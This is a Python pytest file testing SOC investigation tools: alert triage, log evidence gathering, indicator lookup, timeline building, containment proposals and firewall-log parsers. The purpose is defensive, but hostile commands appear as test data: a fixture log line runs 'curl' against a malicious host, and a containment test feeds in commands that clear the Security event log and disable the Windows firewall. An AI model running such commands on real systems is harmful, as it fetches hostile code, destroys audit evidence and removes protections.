"""
Unit tests for the native SOC investigation tools:
- triage_security_alert
- gather_log_evidence
- lookup_threat_indicators
- compress_security_timeline
- propose_containment_response
"""

import pytest
from src.registry.tools.soc_tools import (
    triage_security_alert,
    gather_log_evidence,
    lookup_threat_indicators,
    compress_security_timeline,
    propose_containment_response,
)


@pytest.mark.asyncio
async def test_triage_security_alert_high_risk():
    alert_raw = (
        "CRITICAL ALERT: Unauthorized SSH brute force attack detected from 198.51.100.44. "
        "Failed logins exceeded 50 attempts in 60 seconds."
    )
    result_str = await triage_security_alert(alert_raw)
    assert "=== [SOC TRIAGE REPORT] ===" in result_str
    assert "Assigned Severity : HIGH" in result_str or "CRITICAL" in result_str
    assert "198.51.100.44" in result_str
    assert "Assessment: High probability of active security incident" in result_str


@pytest.mark.asyncio
async def test_gather_log_evidence_file_and_dir(tmp_path):
    log_dir = tmp_path / "logs"
    log_dir.mkdir()
    sample_log = log_dir / "auth.log"
    sample_log.write_text(
        "Sep 17 12:00:01 host sshd[1234]: Failed password for root from 198.51.100.44 port 4321 ssh2\n"
        "Sep 17 12:00:05 host sshd[1234]: Accepted password for admin from 10.0.0.5 port 5432 ssh2\n",
        encoding="utf-8",
    )

    res_str = await gather_log_evidence(str(log_dir), pattern="*.log")
    assert "=== [EVIDENCE COLLECTION:" in res_str
    assert "auth.log" in res_str
    assert "Total Artifacts Analyzed: 1 files" in res_str
    assert "Failed password" in res_str


@pytest.mark.asyncio
async def test_lookup_threat_indicators():
    res_pub = await lookup_threat_indicators("198.51.100.44")
    assert "=== [THREAT DISCOVERY: 198.51.100.44] ===" in res_pub
    assert "Type: IP" in res_pub
    assert "Public WAN Address" in res_pub
    assert "Suspected External C2" in res_pub

    res_priv = await lookup_threat_indicators("10.0.0.1")
    assert "RFC 1918 Private Internal Address" in res_priv
    assert "Risk Level: LOW" in res_priv

    res_hash = await lookup_threat_indicators("44d88612fea8a8f36de82e1278abb02f")
    assert "Type: HASH" in res_hash
    assert "Potential malicious binary" in res_hash


@pytest.mark.asyncio
async def test_compress_security_timeline():
    raw_logs = (
        "2026-09-17T12:00:01 host sshd: Failed password for root from 198.51.100.44\n"
        "2026-09-17T12:05:00 host sshd: Accepted password for user deploy\n"
        "2026-09-17T12:06:30 host auditd: Critical exec sudo curl http://malicious.bin\n"
    )
    res_str = await compress_security_timeline(raw_logs, max_timeline_events=5)
    assert "=== [COMPRESSED INCIDENT TIMELINE] ===" in res_str
    assert "Step 01:" in res_str
    assert "Step 02:" in res_str
    assert "Condensed timeline isolated threat sequence" in res_str


@pytest.mark.asyncio
async def test_propose_containment_response():
    res_str = await propose_containment_response(
        target_entity="198.51.100.44",
        action_type="block_ip",
        justification="Active SSH brute force and C2 egress",
        dry_run=True,
    )
    assert "=== [INCIDENT CONTAINMENT PLAN]" in res_str
    assert "Target Entity  : 198.51.100.44" in res_str
    assert "Action Type    : BLOCK_IP" in res_str
    assert "iptables" in res_str
    assert "Ready for operator approval" in res_str


@pytest.mark.asyncio
async def test_analyze_incident_impact():
    from src.registry.tools.soc_tools import analyze_incident_impact

    impact_report = await analyze_incident_impact("Compromised domain admin credentials on WKSTN-FIN-04")
    assert "=== [ENTERPRISE BLAST RADIUS & IMPACT ASSESSMENT REPORT] ===" in impact_report
    assert "WKSTN-FIN-04" in impact_report
    assert "DC01" in impact_report
    assert "da_admin" in impact_report
    assert "svc_backup_admin" in impact_report
    assert "452.8 MB" in impact_report


@pytest.mark.asyncio
async def test_compress_security_timeline_chronological_sorting():
    # Test with out-of-order timestamps: 10:25 -> 10:14 -> 10:32 -> 10:16
    raw_logs = (
        "[2026-09-14T10:25:00Z] Outbound C2 beaconing to 185.220.101.45:8443\n"
        "[2026-09-14T10:14:02Z] Spear-phishing email delivered with Invoice_90214.docm\n"
        "[2026-09-14T10:32:45Z] High-speed bulk exfiltration to 198.51.100.240:443\n"
        "[2026-09-14T10:16:32Z] Obfuscated PowerShell cradle spawned from WINWORD.EXE\n"
    )
    res_str = await compress_security_timeline(raw_logs, max_timeline_events=5)
    assert "=== [COMPRESSED INCIDENT TIMELINE] ===" in res_str
    lines = [l for l in res_str.splitlines() if "Phase" in l]
    # Verify strict ascending order
    assert "10:14:02" in lines[0]
    assert "10:16:32" in lines[1]
    assert "10:25:00" in lines[2]
    assert "10:32:45" in lines[3]


@pytest.mark.asyncio
async def test_path_healing_and_benchmark_sample(tmp_path):
    from src.core.path_utils import resolve_target_path

    # Simulate AST escaped path with \a (0x07) and \r (0x0d)
    mangled_path = "D:\\Security-logs-test\x07ttack-cases-benchmark\\case-1-apt-enterprise-intrusion\raw-logs"
    healed = resolve_target_path(mangled_path)
    assert "\x07" not in str(healed)
    assert "\r" not in str(healed)
    assert "attack-cases-benchmark" in str(healed)
    assert "raw-logs" in str(healed)


@pytest.mark.asyncio
async def test_cisco_asa_parser():
    from src.registry.tools.soc_tools import _parse_cisco_asa_records

    asa_logs = (
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49152 dst inside:10.10.10.20/21 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49153 dst inside:10.10.10.20/22 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49154 dst inside:10.10.10.20/23 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49155 dst inside:10.10.10.20/80 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49156 dst inside:10.10.10.20/443 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49157 dst inside:10.10.10.20/8080 by access-group \"outside_in\"\n"
        "%ASA-3-201011: Connection limit exceeded 5000/5000 for input packet from 198.51.100.220/1234 to 10.10.10.20/80 on interface outside\n"
        "%ASA-6-113015: AAA user authentication Rejected : reason = User password invalid : server = 10.10.10.1 : user = admin : user IP = 198.51.100.75\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.99/55555 dst inside:10.10.10.20/3389 by access-group \"outside_in\"\n"
    )
    total, findings, ips, users = _parse_cisco_asa_records(asa_logs, "cisco_asa_firewall.log")
    assert total == 9
    assert "198.51.100.220" in ips
    assert "198.51.100.75" in ips
    assert "admin" in users

    findings_text = "\n".join(findings)
    assert "Vertical Port Scan" in findings_text
    assert "Connection Limit DoS" in findings_text
    assert "Brute Force" in findings_text
    assert "BENIGN INTERNET NOISE" in findings_text


@pytest.mark.asyncio
async def test_pfsense_parser():
    from src.registry.tools.soc_tools import _parse_pfsense_records

    pfsense_logs = (
        # Vertical port scan from 198.51.100.50 against 10.10.10.20
        "4,1663412000,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.50,10.10.10.20,54101,21,0,S,123,,,\n"
        "4,1663412001,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.50,10.10.10.20,54102,22,0,S,124,,,\n"
        "4,1663412002,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.50,10.10.10.20,54103,23,0,S,125,,,\n"
        "4,1663412003,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.50,10.10.10.20,54104,80,0,S,126,,,\n"
        "4,1663412004,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.50,10.10.10.20,54105,443,0,S,127,,,\n"
        "4,1663412005,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.50,10.10.10.20,54106,8080,0,S,128,,,\n"
        # Lateral SMB sweep from 198.51.100.15 across 192.168.1.0/24 subnet
        "4,1663412010,em1,match,pass,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.15,192.168.1.10,49100,445,0,S,129,,,\n"
        "4,1663412011,em1,match,pass,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.15,192.168.1.11,49101,445,0,S,130,,,\n"
        "4,1663412012,em1,match,pass,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.15,192.168.1.12,49102,445,0,S,131,,,\n"
        # Trap 3 Benign noise from 198.51.100.99
        "4,1663412020,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.99,10.10.10.20,60000,3389,0,S,132,,,\n"
        # Internal authorized scanner 10.10.10.99
        "4,1663412030,em0,match,pass,in,4,0x0,,64,0,0,DF,6,tcp,60,10.10.10.99,10.10.10.20,50000,80,0,S,133,,,\n"
    )
    total, findings, ips = _parse_pfsense_records(pfsense_logs, "pfsense_filterlog.csv")
    assert total == 11
    assert "198.51.100.50" in ips
    assert "198.51.100.15" in ips
    assert "198.51.100.99" in ips
    assert "10.10.10.99" in ips

    findings_text = "\n".join(findings)
    assert "Vertical Port Scan" in findings_text
    assert "Horizontal Subnet Sweep" in findings_text
    assert "BENIGN INTERNET NOISE" in findings_text
    assert "BENIGN BASELINE AUDIT" in findings_text


@pytest.mark.asyncio
async def test_fortigate_parser():
    from src.registry.tools.soc_tools import _parse_fortigate_records

    fgt_logs = (
        'date=2026-09-17 time=14:22:01 devname="FGT-CORP-FW01" type="utm" subtype="ips" level="alert" severity="critical" srcip=198.51.100.200 dstip=10.10.10.20 srcport=43210 dstport=8080 attack="Apache.Log4j.Error.Log.Remote.Code.Execution" msg="Apache Log4j RCE attempt" action="dropped"\n'
        'date=2026-09-17 time=14:25:00 devname="FGT-CORP-FW01" type="anomaly" subtype="anomaly" severity="critical" srcip=198.51.100.88 dstip=198.51.100.10 attack="syn_flood" count=15000 msg="TCP SYN flood volumetric anomaly detected" action="clear_session"\n'
    )
    total, findings, ips, cves = _parse_fortigate_records(fgt_logs, "fortigate_traffic_ips.log")
    assert total == 2
    assert "198.51.100.200" in ips
    assert "198.51.100.88" in ips
    assert "CVE-2021-44228" in cves

    findings_text = "\n".join(findings)
    assert "Log4j Remote Code Execution" in findings_text
    assert "Volumetric Network Denial of Service" in findings_text


@pytest.mark.asyncio
async def test_multi_firewall_gather_evidence_and_noise_discrimination(tmp_path):
    asa_file = tmp_path / "cisco_asa_firewall.log"
    asa_file.write_text(
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49152 dst inside:10.10.10.20/21 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49153 dst inside:10.10.10.20/22 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49154 dst inside:10.10.10.20/23 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49155 dst inside:10.10.10.20/80 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49156 dst inside:10.10.10.20/443 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49157 dst inside:10.10.10.20/8080 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.99/55555 dst inside:10.10.10.20/3389 by access-group \"outside_in\"\n",
        encoding="utf-8"
    )

    report = await gather_log_evidence(str(tmp_path), pattern="*.log")
    assert "=== [EVIDENCE COLLECTION:" in report
    assert "cisco_asa_firewall.log" in report
    assert "Vertical Port Scan" in report
    assert "198.51.100.220" in report
    assert "FALSE-POSITIVE TRAP & BENIGN BASELINE DISCRIMINATION" in report
    assert "198.51.100.99" in report


@pytest.mark.asyncio
async def test_containment_anti_forensic_rejection():
    # Attempting to clear event logs must be rejected
    rejected_res = await propose_containment_response(
        target_entity="Clear-EventLog -LogName Security",
        action_type="isolate_endpoint",
        justification="Clean up test logs"
    )
    assert "CONTAINMENT POLICY VIOLATION: DESTRUCTIVE ACTION REJECTED" in rejected_res
    assert "strictly PROHIBITED" in rejected_res

    # Attempting to turn firewall state off must be rejected
    rejected_fw = await propose_containment_response(
        target_entity="WKSTN-01",
        action_type="isolate_endpoint",
        justification="netsh advfirewall set allprofiles state off"
    )
    assert "CONTAINMENT POLICY VIOLATION: DESTRUCTIVE ACTION REJECTED" in rejected_fw
